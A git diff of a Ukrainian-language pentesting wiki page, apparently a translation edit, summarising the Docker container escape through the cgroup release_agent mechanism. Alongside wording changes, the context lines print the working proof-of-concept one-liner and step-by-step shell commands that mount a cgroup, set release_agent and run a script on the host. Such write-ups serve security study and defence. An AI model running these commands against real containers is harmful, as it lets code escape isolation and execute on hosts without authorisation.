@@ -18,7 +18,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 **Для отримання додаткової інформації зверніться до** [**оригінального блогу**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Це лише резюме:
 
-Original PoC:
+Оригінальний PoC:
 ```shell
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 mkdir -p $d/w;echo 1 >$d/w/notify_on_release
@@ -29,8 +29,8 @@ $1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 Доказ концепції (PoC) демонструє метод експлуатації cgroups шляхом створення файлу `release_agent` і виклику його для виконання довільних команд на хості контейнера. Ось розбивка кроків, що беруть участь:
 
 1. **Підготовка середовища:**
-* Створюється директорія `/tmp/cgrp`, яка слугує точкою монтування для cgroup.
-* Контролер cgroup RDMA монтується в цю директорію. У разі відсутності контролера RDMA рекомендується використовувати контролер cgroup `memory` як альтернативу.
+* Створюється каталог `/tmp/cgrp`, який слугує точкою монтування для cgroup.
+* Контролер cgroup RDMA монтується в цей каталог. У разі відсутності контролера RDMA рекомендується використовувати контролер cgroup `memory` як альтернативу.
 ```shell
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 ```
@@ -40,15 +40,15 @@ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 ```shell
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
-3. **Налаштуйте агент випуску:**
+3. **Налаштуйте Release Agent:**
 * Шлях контейнера на хості отримується з файлу /etc/mtab.
 * Файл release\_agent cgroup потім налаштовується для виконання скрипту з назвою /cmd, розташованого за отриманим шляхом хоста.
 ```shell
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
-4. **Створіть і налаштуйте скрипт /cmd:**
-* Скрипт /cmd створюється всередині контейнера і налаштовується для виконання ps aux, перенаправляючи вихід у файл з назвою /output в контейнері. Вказується повний шлях до /output на хості.
+4. **Створіть та налаштуйте скрипт /cmd:**
+* Скрипт /cmd створюється всередині контейнера та налаштовується для виконання ps aux, перенаправляючи вихід у файл з назвою /output в контейнері. Вказується повний шлях до /output на хості.
 ```shell
 echo '#!/bin/sh' > /cmd
 echo "ps aux > $host_path/output" >> /cmd
